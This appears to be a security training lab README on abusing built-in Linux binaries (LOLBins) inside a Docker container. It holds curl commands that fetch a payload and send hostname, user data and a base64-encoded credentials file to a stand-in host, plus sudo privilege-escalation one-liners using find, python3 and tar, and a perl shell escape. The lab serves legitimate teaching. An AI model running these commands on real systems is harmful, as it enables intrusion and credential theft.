![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# LOLBins

# Ubuntu VM

## What are LOLBins?

LOLBins are legitimate system binaries already present on an operating system that attackers
abuse for malicious purposes - without ever dropping custom malware. Because these are trusted
system tools, they often bypass antivirus and EDR detection.

Examples: `curl`, `wget`, `python3`, `perl`, `find`, `tar`, `base64`, `nc`

**Reference:** [GTFOBins](https://gtfobins.github.io/) catalogs hundreds of these for Linux.

---

### In this lab we will
- Set up an isolated Docker environment
- Use `curl` to simulate file download and C2 beaconing
- Use `base64` to encode and exfiltrate sensitive data
- Abuse `find` via a sudo misconfiguration to run commands as root
- Abuse `python3` via a sudo misconfiguration to get a root shell
- Abuse `tar` via a sudo misconfiguration to escalate privileges
- Spawn a reverse shell using `python3` and `bash`

---

## Part 1 - Start the Lab Environment

```bash
sudo docker run -it --name lolbins lolbins-lab /bin/bash
```

You are now inside the container as the `student` user.

---

## Part 2 - Reconnaissance

Check who you are and what your privileges look like:
```bash
whoami && id
```

<img width="571" height="70" alt="image" src="https://github.com/user-attachments/assets/c69ebd25-45bd-4571-9553-f5c3aa5f8d84" />


Check what sudo permissions have been granted:

```bash
sudo -l
```

<img width="1279" height="178" alt="2026-05-18_16-42" src="https://github.com/user-attachments/assets/9a3d318f-bee2-4a09-a375-e818e474a8b8" />


You will see that `student` can run `find`, `tar`, and `python3` as root - no password needed.
This simulates a real-world misconfiguration where an admin tries to be helpful without
understanding the security implications. Each of those binaries is a **LOLBin** that can be abused
to get a root shell.

---

## Part 3 - LOLBin #1: curl - File Download and Beaconing

`curl` is one of the most abused LOLBins. Attackers use it to:
- Download payloads from a C2 (command and control) server
- Exfiltrate data via HTTP POST requests
- Bypass firewalls - port 80 and 443 are almost always open outbound

>[!IMPORTANT]
>
>You don't need to run these next 3 commands

Simulate pulling a payload from a C2 server:

```bash
curl -o /tmp/payload.sh https://example.com/payload.sh 2>&1 || echo "Payload download attempted"
```

Simulate a C2 beacon - sending hostname and username back to an attacker:

```bash
curl -s -d "host=$(hostname)&user=$(whoami)" http://192.168.1.100/beacon 2>&1 || echo "Beacon sent"
```

Simulate exfiltrating a file via HTTP POST:

```bash
curl -s -F "file=@/opt/app/config.txt" http://192.168.1.100/upload 2>&1 || echo "File exfil attempted"
```

The key point - `curl` is a standard tool present on almost every Linux system. This traffic
blends in with normal HTTP activity and often does not trigger alerts on its own.

---

## Part 4 - LOLBin #2: base64 - Data Exfiltration and DLP Bypass

Attackers encode files with `base64` to:
- Bypass DLP (Data Loss Prevention) tools that scan outbound traffic for plaintext credentials
- Obfuscate stolen data before sending it out

Look at the readable config file:

```bash
cat /opt/app/config.txt
```

<img width="487" height="87" alt="image" src="https://github.com/user-attachments/assets/b26f1b53-33cc-4a07-a500-220826cd27a8" />

Now encode it - this is what the attacker exfiltrates:

```bash
base64 /opt/app/config.txt
```

<img width="762" height="65" alt="image" src="https://github.com/user-attachments/assets/9cb684fd-ecd7-416b-80b1-eeace890bf8a" />


Decode it on the other side (simulating the attacker recovering the data):
```bash
base64 /opt/app/config.txt | base64 -d
```

>[!IMPORTANT]
>
>You don't need to run this next command

The original credentials come back. In a real attack, the encoded output would be piped
straight into curl and sent to an attacker-controlled server:
```bash
curl -s -d "data=$(base64 /opt/app/config.txt)" http://192.168.1.100/collect 2>&1 || echo "[simulated] Encoded exfil attempted"
```

A DLP tool scanning for `Password1!` in plaintext would miss this entirely.

---

## Part 5 - LOLBin #3: find - Command Execution via sudo

Confirm the misconfiguration:
```bash
sudo -l | grep find
```

The `find` binary has a `-exec` flag that runs arbitrary commands on matched files.
With sudo, those commands run as root.

Read the root flag that `cat` alone would deny you:
```bash
sudo find /root -name "flag.txt" -exec cat {} \;
```

And try to read that file normally to see you don't have permissions for it normally

```bash
cat /root/flag.txt
```

<img width="736" height="91" alt="image" src="https://github.com/user-attachments/assets/d1860370-6923-41e0-8bea-2d1590fe9ef3" />



List everything inside /root:
```bash
sudo find /root -exec ls -la {} \;
```

<img width="598" height="223" alt="image" src="https://github.com/user-attachments/assets/1f31631b-f7f2-486c-8767-add5d4d0501e" />


Write a file to /root as a low-privilege user:
```bash
sudo find /tmp -maxdepth 0 -exec touch /root/student_was_here \;
```

Verify it was created:
```bash
sudo find /root -name "student_was_here" -exec ls -la {} \;
```

You just performed root-level file operations without ever being root - purely through `find`

---

## Part 6 - LOLBin #4: python3 - Privilege Escalation via sudo

`python3` can spawn a shell using `os.system()`. With sudo, that shell is a root shell

Escalate to root:
```bash
sudo python3 -c "import os; os.system('/bin/bash')"
```

Verify you are now root:
```bash
whoami
```

<img width="407" height="67" alt="image" src="https://github.com/user-attachments/assets/ab9c5963-fa8e-40a4-8c6f-1c18f710dc50" />

Read the protected flag:
```bash
cat /root/flag.txt
```

<img width="521" height="47" alt="image" src="https://github.com/user-attachments/assets/c0c13cff-3ac3-4cf0-9620-296cb5aca993" />


You can now do anything on the system. Exit back to student when done:
```bash
exit
```

---

## Part 7 - LOLBin #5: tar - Privilege Escalation via Checkpoint

`tar` has a `--checkpoint-action` flag intended to run commands at intervals during archiving.
Attackers abuse this with sudo to execute arbitrary commands as root.

Escalate to root via tar:
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

Verify you are root:
```bash
whoami
```

```bash
cat /root/flag.txt
```

<img width="1070" height="134" alt="image" src="https://github.com/user-attachments/assets/9c525d44-c176-451e-9130-4e0c3007461b" />

Exit back to student:
```bash
exit
```

---

## Part 8 - LOLBin #6: perl - Shell Spawn

`perl` can directly call `exec` to replace itself with a shell.
Without any special permissions, this just gives you a shell as your current user:

```bash
perl -e 'exec "/bin/bash";'
```

This is useful for attackers inside a restricted shell environment - they break out using
perl instead of bash.

Check who you end up as:
```bash
whoami
```

In this case, you are still **student** because it wasn't a restricted shell environment to begin with

Exit:

```bash
exit
```

---

Exit the container:
```bash
exit
```




---

# Finished?

[Back to Card's Main Page](../Internal_Password_Spray.md)
